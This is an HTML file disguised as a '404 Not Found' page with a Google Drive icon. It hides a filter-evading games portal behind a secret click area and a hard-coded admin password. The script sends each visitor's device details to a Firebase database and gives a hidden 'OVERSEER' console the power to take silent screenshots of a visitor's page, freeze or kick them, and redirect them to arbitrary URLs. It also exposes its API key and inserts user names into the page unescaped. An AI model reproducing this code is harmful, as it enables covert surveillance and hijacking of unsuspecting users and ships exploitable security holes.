<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        #ghostTrigger { position: fixed; top: 0; left: 0; width: 40px; height: 40px; z-index: 2000000; cursor: default; }
        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1500000; display: none; align-items: center; justify-content: center; }
        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 9999999; display: none; cursor: wait; }

        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
        
        .grid-header { padding: 10px 25px 0 25px; font-size: 12px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
        
        .card { background: var(--card); border: 1px solid #222; padding: 20px; text-align: center; cursor: pointer; border-radius: 5px; color: var(--primary); position: relative; transition: 0.2s; }
        .card:hover { border-color: var(--primary); background: #001a00; }
        .fav-btn { position: absolute; top: 5px; right: 5px; color: #333; font-size: 18px; transition: 0.2s; }
        .fav-btn.active { color: var(--fav); }

        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 20px; z-index: 3000000; width: 950px; border-radius: 8px; box-shadow: 0 0 50px #000; }
        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 10px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; }
        .btn { background: var(--primary); color: #000; border: none; padding: 10px 15px; cursor: pointer; font-weight: bold; border-radius: 4px; }
        
        .admin-flex { display: flex; gap: 20px; height: 500px; }
        #userList { width: 300px; border: 1px solid #222; overflow-y: auto; background: #050505; }
        .u-item { padding: 12px; border-bottom: 1px solid #111; cursor: pointer; font-size: 11px; display: flex; flex-direction: column; }
        .u-item:hover { background: #111; }
        .u-item.selected { border-left: 4px solid var(--primary); background: #0a1a0a; }
        
        #dossierData { font-size: 11px; background: #000; padding: 15px; border: 1px solid #222; color: #888; flex-grow: 1; overflow-y: auto; }
        #dossierData b { color: var(--primary); }
    </style>
</head>
<body>

    <div id="ghostTrigger" onclick="handleGhost()"></div>
    <div id="lockdown"><h1>404</h1><p>Not Found</p></div>
    <div id="freeze"></div>

    <div id="loginOverlay">
        <div style="text-align:center; width: 320px;">
            <h2 style="color:var(--primary)">MONGLE_OS v27.0</h2>
            <input type="text" id="username" class="input" placeholder="Identity...">
            <button class="btn" style="width:100%" onclick="startSession()">BOOT SYSTEM</button>
        </div>
    </div>

    <div id="app">
        <div class="nav">
            <div><b>MONGLE_OS</b> <span id="badge" style="font-size:10px; opacity:0.5;"></span></div>
            <div style="display:flex; gap:10px; flex-grow:1; max-width:600px; margin: 0 20px;">
                <select id="cat" class="input" style="width:130px; margin:0;" onchange="renderGames()">
                    <option value="all">ALL_FILES</option>
                    <option value="fnaf">FNAF</option>
                    <option value="horror">HORROR</option>
                    <option value="action">ACTION</option>
                    <option value="favs">FAVORITES</option>
                </select>
                <input type="text" id="search" class="input" style="margin:0;" placeholder="Search..." oninput="renderGames()">
            </div>
            <div style="display:flex; gap:8px;">
                <button id="adminBtn" class="btn" style="display:none;" onclick="toggleModal('adminM')">OVERSEER</button>
                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('settingsM')">⚙️</button>
                <button class="btn" style="background:red; color:#fff;" onclick="doPanic()">PANIC</button>
            </div>
        </div>
        <div id="grid" class="game-grid"></div>
    </div>

    <div id="adminM" class="modal">
        <h3 style="margin-top:0; color:var(--primary);">OVERSEER_CONSOLE v27</h3>
        <div class="admin-flex">
            <div id="userList"></div>
            <div style="flex-grow:1; display:flex; flex-direction:column; gap:10px;">
                <div id="dossierData">Select Target...</div>
                <div id="preview" style="height:150px; border:1px solid #222; background-size:contain; background-repeat:no-repeat; background-position:center;"></div>
                <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:5px;">
                    <button class="btn" onclick="act('capReq')">SHOT</button>
                    <button class="btn" style="background:yellow" onclick="act('frozen')">FREEZE</button>
                    <button class="btn" style="background:red; color:white;" onclick="act('kicked')">KICK</button>
                    <button class="btn" style="background:#444; color:white;" onclick="wipe()">WIPE</button>
                </div>
                <div style="display:flex; gap:5px;">
                    <input type="text" id="adminCmd" class="input" style="margin:0;" placeholder="Message / URL">
                    <button class="btn" onclick="sendCustom('redir')">REDIR</button>
                    <button class="btn" onclick="sendCustom('msg')">MSG</button>
                </div>
            </div>
        </div>
        <button class="btn" style="width:100%; margin-top:10px;" onclick="toggleModal('adminM')">CLOSE</button>
    </div>

    <div id="settingsM" class="modal" style="width:320px;">
        <h3>CONFIG</h3>
        <input type="text" id="pUrl" class="input" placeholder="Panic URL">
        <input type="text" id="pKey" class="input" placeholder="Panic Key">
        <select id="pMode" class="input">
            <option value="tab">New Tab</option>
            <option value="blank">About:Blank</option>
        </select>
        <button class="btn" style="width:100%" onclick="saveSettings()">SAVE</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let userRef, myID, selectedID, isAdmin = false, gameData = [];
        let favs = JSON.parse(localStorage.getItem('favs') || '[]');
        let cfg = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'Escape', mode: localStorage.getItem('pMode') || 'tab' };

        window.handleGhost = () => { if(prompt("ROOT:") === "MONGLE_OWNER_99") { isAdmin = true; document.getElementById('adminBtn').style.display="block"; startSession(); }};

        window.startSession = async () => {
            const name = document.getElementById('username').value || "Guest";
            document.getElementById('lockdown').style.display="none"; document.getElementById('loginOverlay').style.display="none"; document.getElementById('app').style.display="flex";

            const net = navigator.connection || {};
            userRef = push(ref(db, 'presence'), {
                name: name, activity: 'Browsing', joined: new Date().toLocaleTimeString(),
                res: `${screen.width}x${screen.height}`, cores: navigator.hardwareConcurrency || '?',
                ram: navigator.deviceMemory || '?', net: net.effectiveType || 'unknown'
            });
            myID = userRef.key;
            onDisconnect(userRef).remove();

            onValue(ref(db, `presence/${myID}`), (s) => {
                const d = s.val(); if(!d) return;
                if(d.kicked) window.location.replace(cfg.url);
                if(d.redir) window.location.replace(d.redir);
                document.getElementById('freeze').style.display = d.frozen ? 'block' : 'none';
                if(d.msg) { alert("ADMIN: "+d.msg); update(userRef, {msg: null}); }
                if(d.capReq) html2canvas(document.body).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.1), capReq: false}));
            });

            const res = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
            const data = await res.json();
            gameData = data.filter(f => f.name.endsWith('.html') && f.name !== 'index.html');
            renderGames();
            if(isAdmin) listenUsers();
        };

        window.renderGames = () => {
            const q = document.getElementById('search').value.toLowerCase();
            const cat = document.getElementById('cat').value;
            const grid = document.getElementById('grid'); grid.innerHTML = "";
            
            gameData.sort((a,b) => favs.includes(b.name) - favs.includes(a.name)).filter(g => {
                const n = g.name.toLowerCase();
                if (!n.includes(q)) return false;
                if (cat === 'favs') return favs.includes(g.name);
                if (cat === 'fnaf') return n.includes('fnaf');
                if (cat === 'horror') return n.includes('horror') || n.includes('scary');
                return true;
            }).forEach(g => {
                const card = document.createElement('div'); card.className = "card";
                card.innerHTML = `<span class="fav-btn ${favs.includes(g.name)?'active':''}" onclick="toggleFav(event,'${g.name}')">❤</span> ${g.name.replace('.html','').toUpperCase()}`;
                card.onclick = () => {
                    const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${g.name}`;
                    update(userRef, {activity: 'Playing '+g.name});
                    if(cfg.mode==='blank') {
                        let w = window.open('about:blank');
                        w.document.body.innerHTML = `<iframe src="${url}" style="width:100%;height:100vh;border:none;"></iframe>`;
                    } else window.open(url, '_blank');
                };
                grid.appendChild(card);
            });
        };

        window.toggleFav = (e, name) => {
            e.stopPropagation();
            if(favs.includes(name)) favs = favs.filter(f => f !== name);
            else favs.push(name);
            localStorage.setItem('favs', JSON.stringify(favs));
            renderGames();
        };

        function listenUsers() {
            onValue(ref(db, 'presence'), (snap) => {
                const list = document.getElementById('userList'); list.innerHTML = "";
                snap.forEach(c => {
                    const u = c.val();
                    const div = document.createElement('div');
                    div.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
                    div.innerHTML = `<b>${u.name}</b><small>${u.activity}</small>`;
                    div.onclick = () => {
                        selectedID = c.key;
                        document.getElementById('dossierData').innerHTML = `
                            <b>ID:</b> ${c.key}<br><b>JOINED:</b> ${u.joined}<br><b>RES:</b> ${u.res}<br>
                            <b>CORES:</b> ${u.cores} | <b>RAM:</b> ~${u.ram}GB<br><b>NET:</b> ${u.net}
                        `;
                        document.getElementById('preview').style.backgroundImage = `url(${u.lastCap || ''})`;
                        listenUsers();
                    };
                    list.appendChild(div);
                });
            });
        }

        window.act = (t) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${t}`), (s) => update(ref(db, `presence/${selectedID}`), {[t]: !s.val()}), {onlyOnce:true}); };
        window.sendCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCmd').value}); };
        window.wipe = () => { if(confirm("Wipe?")) remove(ref(db, 'presence')); };
        window.doPanic = () => window.location.replace(cfg.url);
        window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
        
        window.addEventListener('keydown', (e) => { if (e.key === cfg.key || e.code === cfg.key) doPanic(); });

        window.saveSettings = () => {
            cfg.url = document.getElementById('pUrl').value; cfg.key = document.getElementById('pKey').value; cfg.mode = document.getElementById('pMode').value;
            localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode);
            alert("SAVED"); toggleModal('settingsM');
        };

        document.getElementById('pUrl').value = cfg.url; document.getElementById('pKey').value = cfg.key; document.getElementById('pMode').value = cfg.mode;
    </script>
</body>
</html>
